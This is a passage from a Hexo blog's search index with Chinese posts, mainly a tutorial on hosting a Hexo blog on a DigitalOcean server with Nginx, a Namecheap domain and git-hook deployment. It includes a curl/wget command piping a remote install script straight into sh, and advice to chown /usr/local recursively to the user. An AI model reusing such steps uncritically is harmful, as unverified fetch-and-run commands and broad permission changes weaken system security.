href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html">打造个性超赞博客Hexo+NexT+GithubPages的超深度优化</a></p></li></ul><h4 id="主题更多新鲜好玩的玩法">主题更多新鲜好玩的玩法~~</h4><p>参考小康大佬的博客<a href="https://www.antmoe.com/posts/a811d614/index.html">Hexo 博客之 butterfly 主题优雅魔改系列</a></p><h4 id="添加音乐播放器（最新版本主题已经实现）"><s>添加音乐播放器（最新版本主题已经实现）</s></h4><h4 id="添加动态背景（最新版本主题已经实现）"><s>添加动态背景（最新版本主题已经实现）</s></h4><h4 id="实现点击出现爱心效果（最新版本主题已经实现）"><s>实现点击出现爱心效果（最新版本主题已经实现）</s></h4><h3 id="一套好教程推荐">一套好教程推荐</h3><ul><li><a href="http://yearito.cn/posts/hexo-get-started.html">Hexo 搭建个人博客系列：基础建站篇</a></li><li><a href="http://yearito.cn/posts/hexo-deploy-to-VPS.html">Hexo 搭建个人博客系列：部署上线篇</a></li><li><a href="http://yearito.cn/posts/hexo-advanced-settings.html">Hexo 搭建个人博客系列：进阶设置篇</a></li><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html">Hexo 搭建个人博客系列：主题美化篇</a></li><li><a href="http://yearito.cn/posts/hexo-writing-skills.html">Hexo 搭建个人博客系列：写作技巧篇</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Hexo+Nginx+Namecheap+DigitalOcean搭建个人博客网站</title>
      <link href="/posts/772e8590.html"/>
      <url>/posts/772e8590.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>想来想去，准备搭建一个自己的个人网站，用来放一些教程、笔记什么的，以备以后之需。</p><p>搭建个人博客有很多种方法，一是使用现成的博客站点，比如CSDN、博客园这些，使用起来比较方便快捷，属于傻瓜式的博客搭建；二是使用Github Pages，用这个最大的好处就是不需要自己申请服务器和域名，一个GitHub账号就可以搞定，0成本，比较适合学生党；三是自己申请一个服务器和域名，这个方法可定制化程度很高，但是成本相对也高。</p><p>这里我使用的是第三种方法，用DigitalOcean+NameCheap搭建域名服务器，用Hexo构建个人博客主页的架构。</p></blockquote><h2 id="准备工作">准备工作</h2><h3 id="在DigitalOcean上申请一个服务器">在DigitalOcean上申请一个服务器</h3><h4 id="1-注册DigitalOcean账号">1. 注册DigitalOcean账号</h4><p>打开<a href="https://m.do.co/c/c9d768f92de6">DigitalOcean</a>进行账号注册，点这个链接会给你$10-$30的优惠额度，相当于可以免费使用两个月。当然也可以像我一样使用<a href="https://education.github.com/pack">GitHub的学生包优惠</a>，可以直接兑换$50的优惠额度。关于GitHub学生包的申请方法，可以自行谷歌。</p><p>不管是否使用GitHub学生包，都需要先注册一个账号，注册账号的时候需要验证你的信用卡信息或者使用PayPal支付$5以证明你有一定的支付能力（使用信用卡不会扣钱）</p><h4 id="2-搭建一个服务器">2. 搭建一个服务器</h4><p>账号创建成功后，使用GitHub学生包的童鞋可以先在<code>Account-Billing</code>里面兑换自己的优惠额度。然后我们就可以开始创建服务器了。</p><p>在Creat里选择Droplets，进入服务器创建的界面。</p><p>在这里我选择了<code>Ubuntu18.04（LTS）</code>作为我的服务器，计划选择了<code>$5/mo</code>，基础配置是 <code>1 CPU 1GB RAM 25GB SSD 1000GB的流量</code>，用来搭建个人网站足够了。</p><p>对于节点地区，我选择了 <code>Singapore</code>，毕竟大部分是在国内访问，选择Singapore节点会更快一点（当然具体是不是还得看实际测速结果）。</p><p>接下来还有一个可选项 <code>Select additional options</code>，虽然不太清楚具体有什么作用，我选择了IPv6和Monitoring这两个。</p><p>对于 <code>Authentication</code>，推荐选择使用SSH keys，安全性会更高一些，<a href="https://www.digitalocean.com/docs/droplets/how-to/add-ssh-keys/">如何生成SSH公钥</a>，可以参考官方文档。</p><blockquote><p>对于Linux系统，几行命令就可以完成，Windows系统就自行参考相关文档吧。</p><p>首先生成SSH公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure></blockquote><p>之后会让你设置个人口令</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Enter file in which to save the key (/home/baymrx/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br></pre></td></tr></table></figure><p>直接一路回车跳过SSH公钥就生成完毕</p><p>使用以下命令查看SSH公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure></blockquote><p>这些设置完了，其他的默认就可以，然后就可以点 <code>Creat Droplet</code>。</p><p>之后会有一个初始化的过程，稍等片刻就可以看到创建完成。</p><h3 id="在Namecheap购买一个域名">在Namecheap购买一个域名</h3><p>同样是使用GitHub学生包，会赠送一年的.me域名。进入<a href="https://nc.me/github/auth">Namecheap网站</a>，查找自己想注册的.me域名有没有被别人占用，如果没有那么创建一个Namecheap的账号，（免费）购买下来就可以。</p><p>随后会让你有一个选择和输入学生邮箱</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564498709762.png" alt=""></p><p>两者应该没啥区别，在这里我选择Exposure，下面的邮箱不一定非得是美国教育邮箱，在这里填写自己的邮箱（GItHub学生包填写GitHub所使用的邮箱），只要能正常接收邮件就可以。</p><p>接下来会有一个认证的过程，输入你地址信息就行。完成后邮箱里会收到一封邮件需要你重置Exposure账户密码</p><h2 id="配置本地环境（以Windows中的WSL为例）">配置本地环境（以Windows中的WSL为例）</h2><h3 id="1-安装Node-js">1. 安装Node.js</h3><p>有两种方法：</p><h5 id="方法一：">方法一：</h5><p>cURL:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install stable</span><br></pre></td></tr></table></figure><h5 id="方法二：">方法二：</h5><p>首先在<a href="https://nodejs.org/en/download/">Node.js</a>官网下载（这里我下载的是linux-x64的，版本号是v10.16.0）并进入到下载目录</p><p>安装Node.js到指定目录<code>/usr/local/lib/nodejs</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /usr/local/lib/nodejs</span><br><span class="line">sudo tar -xJvf node-v10.16.0-linux-x64.tar.xz -C /usr/local/lib/nodejs/</span><br></pre></td></tr></table></figure><p>设置环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.profile</span><br></pre></td></tr></table></figure><p>在文件末尾添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Nodejs</span></span><br><span class="line">VERSION=v10.16.0</span><br><span class="line">DISTRO=linux-x64</span><br><span class="line">export PATH=/usr/local/lib/nodejs/node-$VERSION-$DISTRO/bin:$PATH</span><br></pre></td></tr></table></figure><p>更新profile文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. ~/.profile</span><br></pre></td></tr></table></figure><p>验证安装是否成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm version</span><br><span class="line">npx -v</span><br></pre></td></tr></table></figure><h3 id="2-安装git">2.安装git</h3><p>一般系统会默认安装git，可使用 <code>git --version</code>查看</p><p>如果没安装，使用下面的命令安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository ppa:git-core/ppa</span><br><span class="line">apt update</span><br><span class="line">apt install git</span><br></pre></td></tr></table></figure><h3 id="3-安装Hexo">3. 安装Hexo</h3><p>使用 npm 安装 Hexo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>npm在国内的源的加载速度比较慢，可以使用淘宝源换成cnpm</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>##之后的npm命令都可以使用cnpm马来代替</p><blockquote><p>在这里可能会出现权限问题，解决方案是将 /usr/local 目录的所有者变更为当前用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) /usr/local</span><br></pre></td></tr></table></figure></blockquote><p>安装完成后进入指定文件夹，并建立一个blog目录，cd进入这个目录，安装相关的插件依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir blog</span><br><span class="line">cd blog</span><br><span class="line">hexo init</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>连接可能会有些慢，安装完成后可以在本地运行一下试试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s   #本地跑一下查看博客效果</span><br></pre></td></tr></table></figure><p>初始化完成后会生成一篇默认的文档，它在你博客目录下的<code>/source/_post</code>文件夹中，以md文件存在</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566219869548.png" alt="1566219869548"></p><p><a href="https://hexo.io/zh-cn/docs/commands">Hexo其他相关命令</a></p><h2 id="配置远程服务器（VPS）">配置远程服务器（VPS）</h2><h3 id="1-连接远程服务器">1. 连接远程服务器</h3><p>在自己的终端（之前生成SSH key的设备）中使用SSH连接远程服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSH root@[ip_address]   #这里的IP地址为服务器的公网IP</span><br></pre></td></tr></table></figure><h3 id="2-安装Nginx">2. 安装Nginx</h3><p>下载安装Nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>安装完后启用Nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure><p>随后可以使用服务器的公网IP在自己的浏览器上打开测试</p><p>显示 <code>Welcome to nginx!</code>则表示安装成功</p><h5 id="怎么将域名连接到服务器（域名解析）">怎么将域名连接到服务器（域名解析）</h5><p>在Namecheap的管理界面打开 <code>Domain List</code>，然后在 <code>Advanced DNS</code>中 <code>ADD NEW RECORD</code>，建立两条记录。</p><p>第一条类型为 <code>A Record</code>，host填 <code>@</code>，value填服务器公网的IP</p><p>第二条类型为 <code>CNAME Record</code>，host为<code>www</code>，value为申请的域名。如图</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564582162125.png" alt=""></p><p>保存之后等DNS服务器更新完成，便可以在浏览器使用你自己的域名打开网页。</p><h3 id="3-配置git">3. 配置git</h3><p>创建一个网站的根目录（用于存放网站的部署的静态文件）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/blog</span><br></pre></td></tr></table></figure><p>建立并初始化空的git仓库，只有初始化之后才可以向这个仓库中添加代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">git init --bare blog.git</span><br><span class="line">chown -R git:git blog.git</span><br></pre></td></tr></table></figure><p>配置git钩子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /home/blog.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>在其中添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">rm -rf /var/www/blog</span><br><span class="line">git clone /root/blog.git /var/www/blog</span><br></pre></td></tr></table></figure><p>完成后保存并退出，然后给这个文件赋予可执行权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /home/blog.git/hooks/post-receive</span><br></pre></td></tr></table></figure><h3 id="4-配置Nginx">4. 配置Nginx</h3><p><s>vim /etc/nginx/conf.d/blog.conf</s></p><p><s>然后输入</s></p><p><s>server{<br>listen 8080;<br>root /var/www/blog;<br>}</s></p><p><s>需要将 <code>/etc/nginx/nginx.conf</code>里面的 <code>include /etc/nginx/sites-enabled/</code>这一行注释掉</s></p><p>修改配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure><p>将里面的 <code>root /var/www/html</code>改为<code>root /var/www/blog</code></p><p>保存并退出，重启Nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h2 id="配置本地Hexo">配置本地Hexo</h2><p>当我们完成了服务器的相关配置之后，就要回到本地配置Hexo</p><p>在本机的blog目录中，打开 <code>_config.yml</code>，这是整个Hexo的配置文件</p><p>在文件的最后面有一个 <code>deploy</code>，改成如下信息（注意每个冒号后边不要忘了带一个空格！！！）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">root@[IP_address]:/home/blog.git</span>  <span class="comment">#此处的IP为服务器的公网IP  </span></span><br></pre></td></tr></table></figure><p>之后保存并退出</p><h2 id="创建并发布文档">创建并发布文档</h2><p>在本机中，cd进入blog目录</p><p>安装git自动部署插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save </span><br></pre></td></tr></table></figure><p>对git进行环境配置，否则会报错。这里的用户名和电子邮件地址自定义即可，目的是在git提交时引用这两条信息，说明是谁提交的更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;username&quot;</span><br><span class="line">git config --global user.email example@example.com </span><br></pre></td></tr></table></figure><p>配置完成后便可创建并发布文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;Hello World&quot;</span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>g和d是generate和deploy的简写</p><h2 id="总结">总结</h2><p>至此，历时整整一天，查询了很多资料，一个简单的个人博客网站就算是基本上搭建完成了。接下来就可以使用自己的域名访问博客了。emmm虽然刚建起来有一丢丢丑，但是满满的成就感有没有ヽ(ﾟ∀ﾟ)ﾒ(ﾟ∀ﾟ)ﾉ （丑是可以后天整容的，可以换一个自己喜欢的主题~）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566220070701.png" alt="1566220070701"></p><p>当然，这只能显示最基本的博客内容，还有很多东西需要完善，博客功能的添加，主题的变化等等，再慢慢来吧。</p><h3 id="一些需要注意的地方">一些需要注意的地方</h3><h4 id="CentOS和Ubuntu">CentOS和Ubuntu</h4><p>如果你的VPS系统是CentOS，那么<code>apt-get</code>命令肯定要换成<code>yum</code>。</p><blockquote><p>一般来说著名的linux系统基本上分两大类：<br>1.RedHat系列：Redhat、CentOs、Fedora等<br>2.Debian系列：Debian、Ubuntu等<br>RedHat 系列<br>1 常见的安装包格式 rpm包,安装rpm包的命令是“rpm -参数”<br>2 包管理工具 yum<br>3 支持tar包<br>Debian系列<br>1 常见的安装包格式 deb包,安装deb包的命令是“dpkg -参数”<br>2 包管理工具 apt-get<br>3 支持tar包</p></blockquote><h4 id="Permission-denied">Permission denied</h4><p>在hexo生成静态网页并发布的时候，或者git出现拒绝访问的情况。多半是在安装node.js的时候，使用的权限不同。比如在sudo状态下安装的nodejs在普通用户状态下没法使用，反之亦然。最简单的解决办法就是切换到对应权限的用户进行操作。</p><p>当然也并不绝对，还是要具体问题具体对待，多用谷歌查询一下。</p><h3 id="番外">番外</h3><p>对于域名和服务器只有一年的免费使用期，过了这个期限，就要支付高额的费用了。。想一想我一个穷学生怎样才能负担得起，所以决定留一后手——将博客同步部署到GitHub Pages。算是个备份吧，先留个念想，以后有时间再慢慢实现它…</p><p>最后留几个链接作为以后博客主题优化以及GitHub Pages搭建的参考</p><blockquote><p><a href="https://linghucong.js.org/2016/04/15/2016-04-15-hexo-github-pages-blog/">Hexo+GitHub Pages搭建个人博客并配置相关主题</a></p><p><a href="https://kaihao.io/2018/hexo-blog/">用Hexo搭建博客记录</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
          <category> Nginx </category>
          
          <category> Namecheap </category>
          
          <category> DigitalOcean </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-World">Hello World!</h2><blockquote><p>第一篇博客，，写什么好呢，就随便写写测试一下吧~~</p></blockquote><p>一直以来就想找个方式记录一下自己对着电脑瞎搞搞的历程，恰巧之前注册过GitHub的学生包，里面有免费赠送的域名和服务器。。本着不用白不用的白嫖原则，就正好利用起来搭建一个自己的博客来记录各个美妙的时刻~~</p><p>OK.由此创建了我个人博客的第一篇文章，发出来纪念一下~~~</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
